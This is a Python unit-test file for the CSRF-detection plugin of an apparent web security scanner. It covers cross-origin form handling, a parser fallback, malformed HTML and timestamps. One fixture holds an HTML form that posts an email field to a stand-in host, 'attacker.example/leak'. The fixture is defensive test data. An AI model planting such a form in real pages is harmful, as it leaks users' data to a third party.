"""Tests for the CSRF plugin."""

from unittest.mock import patch

from bs4 import FeatureNotFound

from app.core.scan_unit import ScanUnit, ScanUnitType
from app.plugins.csrf_plugin import CSRFPlugin


def _scan_unit() -> ScanUnit:
    return ScanUnit(type=ScanUnitType.URL, url="https://example.com/")


def _make_test_case(plugin: CSRFPlugin):
    tests = plugin.generate_tests(_scan_unit())
    return tests[0]


def test_skips_cross_origin_form():
    plugin = CSRFPlugin()
    test_case = _make_test_case(plugin)
    body = """
    <html><body>
      <form method='POST' action='https://attacker.example/leak'>
        <input name='email' />
      </form>
    </body></html>
    """
    finding = plugin.analyze_response(
        test_case=test_case,
        response_body=body,
        response_headers={},
    )
    assert finding is None


def test_falls_back_to_html_parser_when_lxml_missing():
    plugin = CSRFPlugin()
    test_case = _make_test_case(plugin)
    body = """
    <html><body>
      <form method='POST' action='/submit'>
        <input name='email' />
      </form>
    </body></html>
    """
    with patch(
        "app.plugins.csrf_plugin.BeautifulSoup",
        side_effect=[FeatureNotFound("no lxml"), __import__("bs4").BeautifulSoup(body, "html.parser")],
    ) as mocked:
        finding = plugin.analyze_response(
            test_case=test_case,
            response_body=body,
            response_headers={},
        )
        assert mocked.call_count == 2
    assert finding is not None


def test_handles_malformed_html_without_raising():
    plugin = CSRFPlugin()
    test_case = _make_test_case(plugin)
    with patch(
        "app.plugins.csrf_plugin.BeautifulSoup", side_effect=ValueError("bad input")
    ):
        finding = plugin.analyze_response(
            test_case=test_case,
            response_body="<broken",
            response_headers={},
        )
    assert finding is None


def test_timestamp_is_timezone_aware():
    plugin = CSRFPlugin()
    test_case = _make_test_case(plugin)
    body = """
    <html><body>
      <form method='POST' action='/submit'>
        <input name='email' />
      </form>
    </body></html>
    """
    finding = plugin.analyze_response(
        test_case=test_case,
        response_body=body,
        response_headers={},
    )
    assert finding is not None
    assert finding.timestamp.tzinfo is not None
